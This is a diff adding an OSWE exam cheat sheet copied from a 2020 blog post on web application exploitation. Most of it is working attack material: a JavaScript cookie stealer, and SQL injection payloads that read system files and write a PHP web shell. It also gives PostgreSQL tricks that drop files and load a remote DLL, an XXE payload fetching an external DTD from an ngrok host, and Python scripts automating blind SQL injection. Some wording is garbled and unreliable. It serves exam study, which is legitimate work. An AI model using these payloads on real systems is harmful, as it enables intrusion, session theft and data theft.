@@ -1,0 +1,693 @@
+##By V1s3r1on Posted on June 10, 2020Posted in cheat sheet, OSWE
+##https://cyber-dragon.nl/2020/06/10/oswe-cheat-sheet/
+
+
+OSWE cheat sheet
+In the coming days I will be working on a cheat sheet for the OSWE exam. 
+Handy things to have in addition.
+
+#######################################################
+#######################################################
+
+Cross site reqeust forgery
+The following script is useful for stealing cookies:
+
+function cookieStealer() {
+    var img = document.createElement('img');
+    img.src = 'URL' + document.cookie;
+    document.body.appendChild(img);
+}
+
+cookieStealer();
+Session hijacking
+Run the command below in browser console (right mouse button -> inspect element):
+
+javascript:void(document.cookie="COOKIE");
+DnsSpy
+Analyzing a DLL or .exe with DnsSpy is done as follows:
+
+Drag the file into the window or click load in the menu and choose a file.
+It is possible to search by looking at the bottom right and then clicking 'search' or go to search from the menu.
+To find cross-reference do the following. right-click on a function in the menu on the left with all functions, then click on Analysis. Now we see the cross-reference.
+To edit a class do the following. Right-click on a method, then Edit Class, after which you can now make adjustments. Then we click on Compile and then on File -> Save all to overwrite the original version.
+Java
+For java we have jd-gui to decompile this. It is useful to decompile a jar file into java files and do this with another program by searching such as visual studio code, sublime text or notepad ++.
+
+below useful commands to know:
+
+javac -source <version> -target <version> <java file> // compiles a java file
+
+echo "Main-Class: test" > META-INF/MANIFEST.MF // is required
+
+jar cmf META-INF/MANIFEST.MF <jar file> <class file>
+
+java -jar <jar file>
+for jd-gui it is also possible to drag and drop a file into the program to load it.
+
+Analysis tips
+If possible, enable database logging. So you can see what is happening in the background
+Use print statements to debug.
+Try to debug the compiled application live. for .NET use DnsSpy and for Java Eclipse is useful.
+Look at the unauthenticated portion of the application first, then look at areas that are likely to have received less attention.
+Watch how user input is filtered or sanitized. is it done on the basis of an open source trusted library or a self-made solution?
+BurpSuite tips
+Minimize your reqeust by removing a parameter each time and resending the reqeust until you get an error. Then you know that it can go there and no further.
+SQL injection
+On input, the following can be tried to see if sql injection is present:
+
+', ",'),"), (),., * /, <! -, -
+Following queries can be used to read files or write files.
+
+# read the content of passed
+UNION SELECT LOAD_FILE ("etc/passwd")-- leest passwd content
+
+# write the php script to a file called shell.php in tmp folder.
+UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
+To execute the above command, you must have file permission.
+
+Code you should pay attention to
+
+# Vulnerable to SQL injection
+$SQL = SELECT * FROM users WHERE username = . " $_GET['userid'] "; 
+This is how you request the version of a Microsoft SQL server:
+
+# Shows version in microsoft SQL server
+' and 1 in (select @@version) -
+The default accounts that are created during installation are as follows:
+
+Microsoft SQL server: sa
+MYSQL: root, anonymous
+Oracle: sys, system, DBSAMP, OUTLN
+Retrieving metadata from the database:
+
+MYSQL: Information_scheme
+Microsoft SQL server: Information_schema
+Oracle: ALL_TABLES, ALL_TAB_COLUMNS
+Below are some queries to request metadata:
+
+-- Oracle statement to enumerate all accessible tables for the current user
+SELECT OWNER, TABLE_NAME FROM ALL_TABLES ORDER BY TABLE_NAME;
+
+-- MYSQL statement to enumerate all accessible tables and databases for the current user
+SELECT table_schema, table_name FROM information_schema.tables;
+
+-- MSSQL statement to enumerate all accessible tables using the system tables
+SELECT name FROM sysobjects WHERE type ='U';
+
+--MSSQL statement to enumerate all accessible tables using the catalog views
+SELECT name FROM sys.tables;
+Union query is only useful if it is directly reflected back to the application, otherwise we will not see the result of the query. Below an example union query.
+
+# Example of union query
+SELECT * FROM members WHERE (firstname LIKE 'admin') UNION ALL SELECT 1,1,1,1#
+MYSQL
+If filtering on space, the following can be used:
+
+/**/ = space
+Example:
+
+select/**/1; 
+find version in MYSQL if filtering is applied:
+
+# evaluate to true
+A')/**/or/**/(select/**/1)=1%23; 
+
+# evaluate to false
+A')/**/or/**/(select/**/1)=0%23; 
+Find out version in MYSQL:
+
+select/**/(substring((select/**/version()),1,1))='5';
+
+or with ascii encoding
+
+select/**/ascii(substring((select/**/version()),1,1)=56;
+To enable database logging do the following:
+
+nano /etc/mysql/my.cnf
+uncomment the following 2 lines
+general_log = /var/log/mysql/mysql.log
+general_log = 1
+Postgresql
+Instead of using the quote (') we can use the following:
+
+select $$ test $$;
+select $ tag $ test $ tag $
+Useful queries:
+
+CREATE TEMP TABLE test (test text);
+INSERT INTO test(test) VALUES ($$welcome$$);
+COPY test(test) TO $$C:\Prgroam Files(x86)\test.txt;
+The following qeury shows whether we are DBA (database administrator):
+
+SELECT CURRENT_SETTING ('is_superuser');
+
+# Time based sql injection
+SELECT+CASE+WHEN+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
+
+Copy from file to table
+COPY <TABLENAME> FROM <Filename>;
+
+Copy from table to file
+COPY <Tablename> TO <Filename>
+
+Copy the text test to the filename
+COPY (SELECT $$test$$) TO <Filename>
+
+Read a file from the system
+1. CREATE TEMP TABLE test (content text);
+2. COPY test FROM $$C:\test.txt$$;
+3. SELECT content FROM test;
+4. DROP TABLE test;
+
+Injecting code to a particular file
+COPY (SELECT convert_from(decode($$encoded_payload$$, $$base64$$), $$utf-8$$)) TO $$C:\\Program+Files+(x86)\\test\\test.vbs$$;
+Enable database logging:
+
+In /etc/postgresql/postgresql.conf change log_statement to 'all'
+Postgresql decode function:
+
+SELECT convert_from(decode('QVdBRQ==','base64'),'utf-8');
+chr and string concatenation:
+
+SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
+
+65 = A
+87 = W
+65 = A
+69 = E
+
+AWAE
+Create a large object:
+
+UPDATE pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
+Export a large object to the system using the loid as the identifier:
+
+SELECT lo_export(1337,'C:\\new_win.ini');
+Delete a large object:
+
+\lo_unlink 1337
+Create a function in postgresql:
+
+CREATE OR REPLACE FUNCTION remote_test(text, integer) test RETURNS VOID AS $$\\IP\test\test.dll$$,$$executeCMD$$ LANGUAGE C STRICT;
+
+SELECT remote_test($$calc.exe$$, 3);
+
+#import the file in de database with the help of the large object.
+SELECT lo_import('C:\\windows\\win.ini');
+
+#Shows running functions
+\lo_list
+
+# making a function with defined loid
+SELECT lo_import('C:\\windows\\win.ini',1337);
+
+# Select the function
+SELECT loid, pageno FROM pg_largeobject;
+To remove the created function we need to do the following:
+
+1) net stop "Applications Manager"
+2) del C:\test.dll
+3) net start "Applications Manager"
+4) DROP FUNCTION test(text, integer);
+Time based sql injection:
+
+SELECT CASE WHEN (ascii(substr( (select+content+from+test), 1, 1)=104) then pg_sleep(10) end;--+
+Version	SELECT version ()
+Comments	SELECT 1; –Comment
+SELECT / * comment * / 1;
+Current User	SELECT user;
+SELECT current_user;
+SELECT session_user;
+SELECT usename FROM pg_user;
+SELECT getpgusername ();
+List Users	SELECT usename FROM pg_user
+List Password Hashes	SELECT usename, passwd FROM pg_shadow - priv
+Password Cracker	MDCrack can crack PostgreSQL's MD5-based passwords.
+List Privileges	SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+List DBA Accounts	SELECT usename FROM pg_user WHERE usesuper IS TRUE
+Current Database	SELECT current_database ()
+List Databases	SELECT datname FROM pg_database
+List Columns	SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind = 'r') AND (N.oid = C.relnamespace) AND (A.attrelid = C.oid) AND ( A.atttypid = T.oid) AND (A.attnum> 0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public')
+List Tables	SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r', ”) AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible (c.oid)
+Find Tables From Column Name	If you want to list all the table names that contain a column LIKE '% password%': SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind = 'r') AND (N.oid = C.relnamespace) AND (A.attrelid = C.oid) AND (A.atttypid = T.oid) AND (A.attnum> 0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND attname LIKE '% password%';
+Time based sql injections
+MYSQL
+
+Resulting query (with malicious SLEEP injected).
+SELECT * FROM products WHERE id = 1-SLEEP (15)
+ 
+Resulting query (with malicious BENCHMARK injected).
+SELECT * FROM products WHERE id = 1-BENCHMARK (100000000, rand ())
+
+Resulting query - Time-based attack to verify database version.
+SELECT * FROM products WHERE id = 1-IF (MID (VERSION (), 1,1) = '5', SLEEP (15), 0)
+SQL Server
+
+Resulting query (with malicious SLEEP injected).
+SELECT * FROM products WHERE id = 1; WAIT FOR DELAY '00: 00: 15 '
+
+Resulting query (verify if user is sa).
+SELECT * FROM products WHERE id = 1; IF SYSTEM_USER = 'sa' WAIT FOR DELAY '00: 00: 15 '
+Oracle
+
+Executing SLEEP () in Oracle (execution suspended 15 seconds).
+BEGIN DBMS_LOCK.SLEEP (15); END;
+PostgreSql
+
+select / / CASE / / WHEN / / ascii (substring ((select / / version ()),% d, 1))) = [CHAR] / / THEN / / SLEEP (5) / / ELSE / / NULL / * * / END
+Extensions
+Handy for file upload bypass
+
+.php
+.php3
+.php4
+.php5
+.php7
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+
+Double extensions
+.jpeg.php
+.jpg.php
+.png.php
+Serialization / Deserialization
+Python
+Blackbox approach
+If the traffic contains data that the symbol. at the end it is most likely that the data was sent using serialization.
+
+Whitebox approach
+The following API in Python is vulnerable to serialization attacks. Search for the for the following patterns:
+
+import pickle
+data = """ cos.system(S'dir')tR. """
+pickle.loads(data)
+Using PyYaml with load:
+
+import yaml
+document = "!!python/object/apply:os.system ['ipconfig']"
+print(yaml.load(document))
+Using jsonpickle in conjunction with encode or store methods.
+
+Java
+Whitebox approach
+The following terms are useful for looking up:
+
+XMLDecoder with external user-defined parameters.
+XStream together with fromXML
+ObjectInputStream () with readObject
+readObject
+readObjectNodData
+readResolve
+readExternal
+ObjectInputStream.readUnshared
+Serializable
+Blackbox approach
+If the reqeust shows the following:
+
+AC ED 00 05 in hex
+rO0 in Base64
+Content-Type set to application / x-java-serialized-object
+CSharp
+Whitebox approach
+Search the source code for:
+
+TypeNameHandling
+JavaScriptTypeResolver
+Look for any serializer where the type is set by user-managing variable.
+Blackbox approach
+The following base64 encoded content starts with:
+
+AAEAAD /////
+Search for content with the following text:
+
+TypeObject
+$ type:
+Search terms
+Number of terms that can be searched for in the source code.
+
+PHP
+Exec_shell
+Exec
+system
+doll
+create_function
+require
+move_uploaded_file
+unserialize
+serialize
+SELECT
+FROM
+WHERE
+eval
+In php the ENT_QUOTES convert double and single quotes.
+
+PHP magic_quotes has been removed since version 5.4.0 and is not available by default. In addition, the mysql_connect function is standard available in PHP from version 5.0.
+
+In the case of the hash below this is seen as an integer and in the case of loose comparison this can be misused:
+
+0e1234551312312
+0E131231331212312
+0.12312331231312
+The above hashes all fall under the exponential number format and this means that it starts with a 0 followed by e / E /. and all songs.
+
+Java
+doGet
+doPost
+doPut
+doDelete
+doCopy
+doOptions
+XXE
+An example script for a XXE attack:
+
+# Loads the etc/passwd file and shows content
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+<item>
+    <product>&test;</product>
+</item>
+An example script of a DTD (Document Type Definition):
+
+# test.dtd
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> 
+You can request files in combination with the following script:
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://2ad0a748.ngrok.io/test.dtd"> %dtd; %all;]> 
+<item>
+    <product>&fileContents;</product>
+</item>
+GREP
+Grep command to quickly search through code.
+
+grep -rnw / tmp -e "test" --color
+If you don't want something in your search results, for example javascript files, do the following:
+
+grep -rnw / tmp -e "test" --color --exclude = *. js
+In addition to grep, egrep can also be used:
+
+egrep '/$addslashes.*=.*' / tmp / test_script / -r --color
+Java
+The main class to access files and directories in java is java.io.File.
+
+String userinput = "..\\boot.ini";
+File f = new File("C:\\temp", userinput);
+The most commonly used classes in java for reading and writing files are:
+
+Java.io.FileInputStream
+Java.io.FileOutputStream
+Java.io.FileReader
+Java.io.FileWriter
+Java API's most used classes for arbitrary string execution as a sql query:
+
+Java.sql.Connection.CreateStatement
+Java.sql.Statement.Execute
+Java.sql.Statement.ExecuteQeury
+String username = "admin' or 1=1--";
+String password = "foo";
+Statement s = connection.CreateStatement();
+
+s.executeQeury("SELECT * FROM users WHERE username = "' + username + "' AND password = "' + password + "'");
+The following APIs can execute external commands from the java application:
+
+Java.lang.Runtime.Runtime.GetrunTime
+Java.lang.runtime.Runtime.Exec
+ASP.NET
+ASP.NET applications obtain user-controlled input through the System.web.HttpReqeust class. System.io.File is the main class to access files. The following classes are best known for reading or writing files:
+
+System.io.FileStream
+System.io.StreamReader
+System.io.StreamWriter
+Executing SQL statements:
+
+System.Data.SqlClient.SqlCommand
+System.Data.SqlClient.SqlDataAdapter
+System.Data.Oledb.OleDbCommand
+System.Data.Odbc.OdbcCommand
+System.Data.SqlServerCe
+In ASP.NET the web.config xml file in the root directory contains the configuration settings of the ASP.NET application.
+
+Scripts
+Get information from the database (MySql):
+
+import requests
+
+url = "http://127.0.0.1/test/test.php?id=2&q="
+ascii_injection = """O') AND ASCII(SUBSTR(({}),{},{})){} AND BENCHMARK(3000000,SHA1(1337))%23"""
+STARTING_POINT = 32
+FINISH_POINT = 126
+JUMPS = 10
+
+def get_final_payload(query, first, second, result):
+    return ascii_injection.format(query, first, second, result).replace(" ","/**/")
+
+def test(injection):
+    print(injection)
+    req = requests.get(url + injection)
+    print(req.elapsed)
+
+    if int(str(req.elapsed)[6]) > 0:
+        return True
+    return False
+
+def extract(query, pos):
+    specific = True
+
+    while True:
+
+        char = STARTING_POINT
+        follow = False
+        while not follow:
+            char += JUMPS
+
+            if char >= FINISH_POINT + JUMPS:
+                specific = False
+                break
+
+            follow = test(get_final_payload(query, pos, pos, f"<{char}"))
+
+        if specific:
+            for i in range(char-10, char+1):
+                if test(get_final_payload(query, pos, pos, f"={i}")):
+                    return chr(i)
+        return ""
+
+def extract_all(query):
+    pos = 0
+    final = ""
+    follow = True
+
+    while follow:
+        pos +=1
+        follow = extract(query, pos)
+        final += follow
+        print(final)
+
+    return final
+
+
+while True:
+    query = input("$ ")
+
+    print(extract_all(query))
+Easier script to retrieve data from database (MySql):
+
+import sys
+import requests
+
+def extract_info(ip, inj_str):
+    try:
+        for j in range(32, 126):
+            target = "http://%s/test.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
+            r = requests.get(target)
+            content_length = int(r.headers['Content-Length'])
+            if (content_length > 20):
+                return j
+    except:
+        for j in range(32, 126):
+            target = "http://%s/test.php?q=%s" % (ip, inj_str.replace("[CHAR]", int(j)))
+            r = requests.get(target)
+            content_length = int(r.headers['Content-Length'])
+            if (content_length > 20):
+                return j
+    
+    return None
+
+
+def main():
+    if len(sys.argv) != 2:
+        print("[+] usage: {} <injection string>").format(sys.argv[0])
+        sys.exit(-1)
+
+    ip = sys.argv[1]
+
+    print("[*] Retrieving database version...")
+    for i in range(1, 20):
+        injection_string = "test')/**/or/**/(select/**/ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
+        extracted_char = chr(extract_info(ip, injection_string))
+        sys.stdout.write(extracted_char)
+        sys.stdout.flush()
+    
+    print("\n[*] Done")
+
+
+if __name__ == "__main__":
+    main()
+Create a text file on victim's computer (PostgreSql):
+
+import sys
+import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def main():
+    ip = 'http://127.0.0.1'
+    url = '{}:1234/servlet/TestServlet'.format(ip)
+    sqli = ";select+case+when+(select+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(20)+end;--+"
+    copy_to = ";COPY+(select+$$test$$)+to+$$c:\\\test.txt$$;--+"
+    binary_data_sqli = ";COPY+(select+$$test$$)+to+$$c:\\\test.dat$$+with+BINARY;--+"
+
+
+    r = requests.get(url,params='ForMasRange=1&userId=1%s' % binary_data_sqli ,verify=False)
+#    print r
+    print(r)
+#    print r.headers
+#    print copy_to
+
+if __name__ == '__main__':
+    main();
+This script logs into a website:
+
+import sys
+import hashlib
+import requests
+
+def gen_hash(password, token):
+    result = hashlib.sha1(password + token)
+    hex_dig = result.hexdigest()
+    print(hex_dig)
+    return hex_dig
+
+
+def we_can_login_with_a_hash():
+    target = "http://{}/login.php".format(sys.argv[1])
+    token = "hax"
+    hashed = gen_hash(sys.argv[2], token)
+    d = {
+        "form_password_hidden" : hashed,
+        "form_login" : "test",
+        "submit" : "Login",
+        "token" : token
+    }
+    s = requests.Session()
+    r = s.post(target, data=d)
+#    print(s)
+#    print(r)
+    res = r.text
+#    print(res)
+
+    if "succesfully signed in" in res or "User: test" in res:
+        return True
+    return False
+
+
+def main():
+    if len(sys.argv) != 3:
+        print("Not enough parameters")
+        sys.exit(-1)
+    if we_can_login_with_a_hash():
+        print("(+) Success")
+    else:
+        print("(-) Failure!")
+
+
+if __name__ == "__main__":
+    main()
+A script that creates a zip file:
+
+#!/usr/bin/python
+import zipfile
+from cStringIO import StringIO
+
+def create_zip():
+    f = StringIO()
+    z = zipfile.Zipfile(f, 'w', zipfile.ZIP_DEFLATED)
+    z.writestr('test.txt', 'this is a test')
+    z.close()
+    zip = open('test.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+create_zip()
+Java
+Below is an example script to build a java class to compile to a jar file and run.
+
+// Place import statements here
+
+class Sample_Class {
+
+  // Declare global variable here
+  
+  public int sample_func() {
+    System.out.println("Sample text");
+    return 0;
+  }
+
+  public static void main(String[] args){
+    int ret = (new Sample_Class()).sample_func();
+  }
+}
+How to compile a java file to a jar to run it:
+
+1. javac filename.java
+2. java filename
+
+for example:
+
+javac test.java
+java test
+NodeJS
+In nodejS it is useful to start looking for low hanging fruit including:
+
+eval
+Windows
+Below are some useful commands for a Windows environment.
+
+The command below shows the SQL log files:
+
+Get-content pathtotextfile -Tail 0 -Wait || tail -f in windows to see sql logs
+Linux
+To transfer files you can do the following:
+
+scp remote_username@10.10.0.2:/remote/file.txt /local/directory
+The command below converts the result from xxd to hex code for use in exploit code:
+
+xxd <filename> | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > output_file.txt
+set up an SMB share:
+
+1) mkdir /tmp/test
+2) sudo impacket-smbserver test /tmp/test/
+The command below will show the mysql log live:
+
+tail -f -n 300 /var/log/mysql/mysql.log
+Regex
+Below searches for everything that contains a 'qeury', for example:
+
+String $ query = 'SELECT * FROM users where username = "+ name +";
+^.*qeury.*?select.*?
+Sources
+http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
+https://www.rexegg.com/regex-quickstart.html
+https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf
+
+#######################################################
+#######################################################
+##
+##
